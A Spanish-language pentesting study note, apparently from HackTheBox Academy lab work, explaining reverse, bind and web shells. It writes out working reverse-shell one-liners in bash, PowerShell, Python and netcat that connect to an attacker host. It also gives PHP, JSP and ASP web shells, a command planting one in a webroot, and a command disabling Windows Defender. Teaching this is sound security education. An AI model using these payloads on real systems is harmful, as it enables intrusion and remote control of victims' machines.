---

---
-----
- Tags: #linux #shell 
---------
## Definición

> Una **shell** es un programa informático que permite al usuario ejecutar comandos para interactuar con el sistema operativo, entre las shells más conocidas tenemos bash y zsh. En este documento se explica el concepto y funcionamiento básico de los shells, además de un ejemplo práctico de su funcionamiento. El siguiente recurso viene muy bien para crear reverse shells en función del sistema y lenguaje: https://www.revshells.com/

## Tipos de shell

Principalmente se utilizan 2 tipos de shell: **reverse shell** y **bind shell**, aunque ta,mbién existen las **forward shell**. Esta última es útil si nos encontramos frente a un firewall que necesitamos evadir, y buscamos la forma de tener una TTY interactiva. Veamos las diferencias de los shells TCP.

#### 1. Reverse Shell

Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.

En este caso, es el servidor web quien se conecta a la maquina del atacante (antes referenciada como cliente). Para ello, lo que hacemos es levantar un servicio en la maquina del atacante, en un puerto de escucha. Luego el servidor web se conecta a esta pasándole como referencia la shell del mismo servidor.

![[reverse_shell3.png| 700]]

Los atacantes que realizan una reverse shell, muchas veces hacen uso de los servicios de VPS, en donde pueden tener direcciones IP publicas y configurar las 
reglas del gateway, para poder establecer la conexión entrante de la víctima y así poder ejecutar comandos en el sistema operativo. Las reverse shell con [[Netcat]] se pueden crear de la siguiente forma:

1. Por un lado, usamos [[Netcat]] para ponernos en modo escucha con un puerto, de esta manera: 
``` bash
nc -nlvp 4444
```

| Flag    | Descripción                                                                                   |
| ------- | --------------------------------------------------------------------------------------------- |
| -l      | Modo escucha, para esperar que se conecte una conexión entrante.                              |
| -v      | Modo verbose, para que se muestre información detallada cuando se reciba una conexión.        |
| -n      | Deshabilita la resolución DNS y se conecta únicamente por IP, acelerando la conexión.         |
| -p 4444 | Número de puerto en el que netcat está escuchando, al que se debe enviar la conexión inversa. |

2. Enviamos la revershe shell al equipo por dicho puerto: 
``` bash 
ncat -e /bin/bash <IP_victima> 4444
```

Otra forma de hacerlo es con la one liner:

```bash
bash -c "bash -i >& /dev/tcp/MI_IP/4444 0>&1"
```

Si no nos traga la URL el carácter `&`, lo sustituimos con `%26`.

![[reverse_shell2.png]]

Como podemos ver en la imagen, es la máquina del servidor web quien se conecta a la máquina del atacante entablando una conexión y permitiendo que sea el atacante quien ejecute comandos en la máquina del servidor web. 

En el siguiente enlace podemos ver múltiples reverse shell: [Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), o en este otro [Github](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#rust)

Existen múltiples formas de realizar una reverse shell. Ya hemos visto el oneliner básico con bash, aunque podemos utilizar `mkfifo`, en este ejemplo:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Desglosando el oneliner:

##### 1. Eliminar el archivo /tmp/f

```bash
rm -f /tmp/f;
```

**`rm -f /tmp/f;`**: Este comando elimina el archivo `/tmp/f` si existe. La opción **`-f`** le indica al comando `rm` que ignore los errores si el archivo no existe. El **`;`** al final asegura que el siguiente comando se ejecute de manera secuencial, después de eliminar el archivo.

##### 2. Crear un pipe con nombre (FIFO)

```
mkfifo /tmp/f;
```

`mkfifo /tmp/f;`**: Este comando crea un archivo de _pipe_ con nombre, también conocido como _FIFO_ (First In, First Out), en la ubicación **`/tmp/f`**. Los _pipes_ son una forma de redirigir la salida de un comando a otro. El **`;`** asegura que el siguiente comando se ejecute después de este.

##### 3. Redirección de salida

```bash
cat /tmp/f |
```

Este comando lee el contenido del archivo _pipe_ **`/tmp/f`** utilizando **`cat`**. El **`|`** (pipe) redirige la salida estándar de `cat /tmp/f` hacia el siguiente comando en la cadena de comandos.

##### 4. Configurar opciones de Shell

```bash
/bin/bash -i 2>&1 |
```

Este comando inicia una nueva instancia de **Bash** con la opción **`-i`**, que hace que la shell sea interactiva. La **`2>&1`** redirige el flujo de errores estándar (**2**) hacia la salida estándar (**1**). Esto asegura que tanto los errores como la salida estándar se redirijan correctamente al siguiente comando a través del pipe **`|`**.

##### 5. Abrir una conexión con Netcat

```bash
nc 10.10.14.12 7777 > /tmp/f
```

Este comando utiliza **Netcat (nc)** para abrir una conexión a la máquina atacante (**`10.10.14.12`**) en el puerto **`7777`**. La salida de la conexión de Netcat se redirige al archivo **`/tmp/f`** usando **`>`**, lo que significa que cualquier información enviada por la máquina atacante se guardará en **`/tmp/f`**.

****

O en powershell:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Vamos a desglosar todo el payload:

##### Llamando a Powershell:

```cmd-session
powershell -nop -c 
```

Ejecuta `powershell.exe` sin perfil (`nop`) y ejecuta el bloque de comando `-c` que hay dentro de las comillas dobles. Este comando particular está dentro del command prompt, que es el motivo de por qué PowerShell está al principio del comando

##### Binding el socket

```cmd-session
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```

##### Estableciendo el command stream

```cmd-session
$stream = $client.GetStream();
```

Evalúa la variable `$stream` igual a la variable `$client` y el método `GetStream` del framework .NET que facilita las comunicaciones de red.

##### Byte Stream vacío

```cmd-session
[byte[]]$bytes = 0..65535|%{0}; 
```

Crea un array vacío llamado `$bytes` que devuelve 65535 ceros como valores del array. Esto es esencialmente un byte stream vacío que será direccionado al listener TCP en la máquina atacante que espera una conexión

##### Parámetros del stream

```cmd-session
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

Comienza un bucle while conteniendo la variable `$i` igual a Stream.Read (método) del framework .NET. 

##### Estableciendo el Byte Encoding

```cmd-session
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

Se establece o evalúa la variable `$data` igual a (=) una clase del framework .NET encargada de codificar en ASCII. Esta clase se usa junto con el método `GetString` para convertir el flujo de bytes (`$bytes`) en texto ASCII.
En resumen, lo que escribimos y enviamos no se transmite simplemente como bits vacíos, sino como texto codificado en ASCII. El punto y coma (`;`) asegura que los comandos se ejecuten de forma secuencial.

##### Invoke-Expression

```cmd-session
$sendback = (iex $data 2>&1 | Out-String ); 
```

Se establece o evalúa la variable `$sendback` igual a (=) el resultado de ejecutar el cmdlet `Invoke-Expression (iex)` sobre la variable `$data`. Luego, se redirige el error estándar (`2>`) y la salida estándar (`1`) a través de un pipe (`|`) hacia el cmdlet `Out-String`, que convierte los objetos de entrada en cadenas de texto.

Debido a que se utiliza `Invoke-Expression`, todo lo que esté almacenado en `$data` será ejecutado en la máquina local. El punto y coma (`;`) asegura que los comandos se ejecuten de forma secuencial.

##### Mostrar directorio de trabajo

```cmd-session
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```

Se establece o evalúa la variable `$sendback2` igual a (=) la variable `$sendback` más (+) la cadena de texto `PS` (`'PS'`) más (+) el camino del directorio de trabajo (`(pwd).Path`) más (+) la cadena de texto `'> '`.  
Esto dará como resultado el prompt de la shell como `PS C:\workingdirectoryofmachine >`. El punto y coma (`;`) asegura que los comandos se ejecuten secuencialmente. Recuerda que el operador `+` en programación combina cadenas cuando no se están usando valores numéricos, con la excepción de ciertos lenguajes como C y C++ donde sería necesario usar una función.

##### Establece el Sendbyte

```cmd-session
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

Se establece o evalúa la variable `$sendbyte` igual a (=) la secuencia de bytes codificada en ASCII que utilizará un cliente TCP para iniciar una sesión de PowerShell con un Netcat listener que se está ejecutando en la máquina atacante.

##### Cerrando la conexión

```cmd-session
$client.Close()"
```

****

Veamos otro ejemplo, esta vez con Windows.

##### 1. Haciendo de servidor (máquina atacante)

```shell-session
amr251@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

Esta vez, configuramos nuestro _listener_ (escucha) en el **puerto 443**, que normalmente se usa para conexiones **HTTPS**. Usar puertos comunes como este **ayuda a evitar que las conexiones salientes sean bloqueadas por firewalls**, ya que bloquear el puerto 443 es poco común (muchas apps lo necesitan para navegar).

⚠️ Sin embargo, **firewalls más avanzados** que inspeccionan el contenido de los paquetes (inspección profunda o _Layer 7_) pueden detectar y bloquear shells reversas, **aunque usen puertos comunes**.

##### 2. Haciendo de cliente (máquina víctima)

Por no copiar el mismo comando, es el de arriba de powershell. Si lo ejecutamos, vamos a ver este error:

```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

**El software antivirus (AV) Windows Defender detuvo la ejecución del código.** Esto funciona exactamente como se espera, y desde una perspectiva defensiva, es un logro.  
Desde el punto de vista ofensivo, hay algunos obstáculos que superar si el antivirus está activado en un sistema al que intentamos conectarnos.

Para nuestros fines, querremos desactivar el antivirus desde la configuración de **"Protección contra virus y amenazas"**, o utilizando este comando en una consola de PowerShell con privilegios de administrador (clic derecho, ejecutar como administrador):

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Finalmente, desde el servidor (máquina atacante):

```shell-session
amr251@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

****

Ejemplo de una reverse shell con Python:

```python
python -c '
	import socket,subprocess,os;
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
	s.connect(("<IP_ATACANTE>",443));
	os.dup2(s.fileno(),0); 
	os.dup2(s.fileno(),1); 
	os.dup2(s.fileno(),2);
	p=subprocess.call(["/bin/sh","-i"]);
'
```

Podemos obtener una TTY funcional con python de forma sencilla con `python -c 'import pty; pty.spawn("/bin/bash")'`
### 2. Bind Shell

Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

 El usuario el cual proporciona la shell, espera una conexión en un puerto en específico. Cuando un cliente se conecta a este puerto, se entabla una comunicación, en la cual todo lo que envía el usuario se considera un comando que se inserta en la shell del usuario.

![[bind_shell3.png| 700]]

Como se ve en la imagen, nos conectaríamos directamente con la dirección IP y el puerto que está escuchando en el objetivo. Sin embargo, este método puede presentar varios desafíos. Aquí hay algunos a tener en cuenta:

- Tendría que haber un _listener_ (escucha) ya iniciado en el objetivo.
- Si no hay ningún _listener_ activo, necesitaríamos encontrar una forma de hacerlo funcionar.
- Los administradores suelen configurar reglas de cortafuegos estrictas para conexiones entrantes y NAT (con implementación de PAT) en el borde de la red (zona expuesta al público), por lo que necesitaríamos estar ya dentro de la red interna.
- Los cortafuegos del sistema operativo (en Windows y Linux) probablemente bloquearán la mayoría de las conexiones entrantes que no estén asociadas a aplicaciones de red de confianza.

Para realizar una bind shell se siguen los siguientes pasos:

1. En la máquina víctima (del usuario), se configura la shell de escucha (bind shell):
``` bash
nc -lvp PORT -e /bin/bash
```

2. En la máquina del atacante (cliente), establecer una conexión al puerto de escucha:
``` bash
nc <IP_victima> PORT
```

![[bind_shell2.png]]

Este tipo de shell es viable en una red local, ya que no existe una restricción de que puerto se pueden usar y cuales están cerrados por defecto. Ahora, en el caso de que se comuniquen dos computadores en redes distintas, existe un gran problema puesto que se debería abrir el puerto de la conexión en el Gateway, para que un cliente externo pueda conectarse a la máquina del usuario y entablar la conexión.

##### Practicando la Bind Shell con Netcat (GNU)

Primero, necesitamos iniciar nuestra máquina de ataque y conectarnos al entorno de red de la víctima. Luego, asegurarnos de que nuestro objetivo esté iniciado. En este escenario, vamos a interactuar con un sistema **Ubuntu Linux** para entender cómo funciona una **bind shell**. Para ello, utilizaremos **Netcat (nc)** tanto en el cliente como en el servidor.

Una vez conectados a la máquina objetivo mediante **SSH**, iniciamos un _listener_ (escucha) con Netcat:

**1. Servidor (Objetivo) - Iniciando el _listener_ de Netcat**

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

En este caso, el objetivo actuará como servidor, y nuestra máquina de ataque será el cliente. Al presionar Enter, se inicia el _listener_ y queda a la espera de una conexión desde el cliente.

**2. Cliente (máquina de ataque) – Conectándose al objetivo**

```shell-session
amr251@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Observa cómo estamos usando **Netcat** tanto en el cliente como en el servidor. En el lado del cliente, especificamos la dirección IP del servidor y el puerto configurado para escuchar (7777). Una vez que la conexión se establece con éxito, aparece el mensaje **“exitosa”** en el cliente, y en el servidor se muestra que ha recibido una conexión.

**3. Servidor (Objetivo) – Recibiendo conexión del cliente**

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!   
```

Debemos tener en cuenta que esto **no es una shell completa**, solo una sesión TCP creada con Netcat. Podemos comprobar su funcionamiento enviando un mensaje simple desde el cliente y observando que se recibe en el servidor.

**4. Cliente – Enviando mensaje "Hello Academy"**

```shell-session
amr251@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy 
```

Al escribir el mensaje y pulsar Enter, veremos cómo se recibe ese mensaje en el lado del servidor.

**5. Servidor – Recibiendo el mensaje "Hello Academy"**

```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

##### Estableciendo una bind shell básica con Netcat

Hemos demostrado que podemos usar **Netcat** para enviar texto entre el cliente y el servidor, pero **esto no es una _bind shell_**, ya que **no podemos interactuar con el sistema operativo ni con el sistema de archivos**. Solo somos capaces de pasar texto dentro del canal (_pipe_) que Netcat establece.

Ahora vamos a utilizar Netcat para **servir una shell real**, y así establecer una verdadera _bind shell_.

En el lado del **servidor (la máquina objetivo)**, necesitaremos:

- Especificar el directorio
- Invocar la shell,
- Configurar el listener,
- Trabajar con tuberías (_pipelines_),
- Y realizar redirección de entrada y salida,

**1. Servidor - Estableciendo una bind shell a la sesión TCP**

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**2. Cliente - Conectando a la bind shell del objetivo**

```shell-session
amr251@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```


****

### 3. Web Shell

Es un script web, como PHP o ASPX que acepta nuestro comando a través de parámetros de solicitudes HTTP como GET o POST, ejecuta nuestro comando e imprime la salida de vuelta en la página web. 

Lo primero de todo es escribir el web shell correspondiente a través de una solicitud GET, ejecutarlo e imprimir el resultado de vuelta. Normalmente es un one-liner muy corto que podemos memorizar fácilmente. Aquí tenemos varios ejemplos en PHP, JSP y ASP:

En PHP (el más común):

```php
<?php system($_REQUEST["cmd"]); ?>
```

En JSP:

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

En ASP:

```asp
<% eval request("cmd") %>
```

Una vez que tenemos nuestra web shell, necesitamos colocar el script de la web shell en el directorio web (webroot) del host remoto para ejecutar el script a través del navegador. Esto puede realizarse mediante una vulnerabilidad en una función de carga (upload), lo que nos permitiría escribir una de nuestras shells en un archivo, por ejemplo, `shell.php`, subirlo y luego acceder al archivo subido para ejecutar comandos.

Sin embargo, si solo contamos con ejecución remota de comandos a través de un exploit, podemos escribir nuestra shell directamente en el webroot para acceder a ella vía web. Por lo tanto, el primer paso es identificar dónde se encuentra el webroot. A continuación, se muestran los webroots predeterminados para algunos servidores web comunes:

| Servidor Web | Webroot Predeterminado       |
|--------------|------------------------------|
| Apache       | `/var/www/html/`             |
| Nginx        | `/usr/local/nginx/html/`     |
| IIS          | `c:\inetpub\wwwroot\`         |
| XAMPP        | `C:\xampp\htdocs\`           |

Podemos comprobar estos directorios para ver cuál webroot se está utilizando y, a continuación, usar `echo` para escribir nuestra web shell. Por ejemplo, si estamos atacando un host Linux que ejecuta Apache, podemos escribir una shell PHP con el siguiente comando:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Finalmente, debemos acceder al web shell, podemos hacerlo por el navegador (url) o usando `curl`. 

```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
